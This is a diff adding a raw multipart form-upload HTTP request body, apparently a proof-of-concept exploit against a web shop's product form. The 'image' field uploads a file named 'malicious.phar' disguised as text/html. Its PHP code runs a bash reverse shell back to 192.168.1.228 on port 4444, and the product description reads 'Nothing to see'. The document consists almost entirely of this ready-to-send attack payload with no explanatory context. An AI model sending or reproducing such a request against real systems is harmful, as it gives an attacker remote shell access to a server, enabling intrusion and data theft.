@@ -1,0 +1,28 @@
+-----------------------------414018432521906484031543370952
+Content-Disposition: form-data; name="id"
+
+1
+-----------------------------414018432521906484031543370952
+Content-Disposition: form-data; name="id_user"
+
+1
+-----------------------------414018432521906484031543370952
+Content-Disposition: form-data; name="name"
+
+Raspberry Pi
+-----------------------------414018432521906484031543370952
+Content-Disposition: form-data; name="image"; filename="malicious.phar"
+Content-Type: text/html
+
+<?php
+exec('/bin/bash -c "bash -i >& /dev/tcp/192.168.1.228/4444 0>&1"');
+?>
+-----------------------------414018432521906484031543370952
+Content-Disposition: form-data; name="description"
+
+Nothing to see
+-----------------------------414018432521906484031543370952
+Content-Disposition: form-data; name="price"
+
+92
+-----------------------------414018432521906484031543370952--
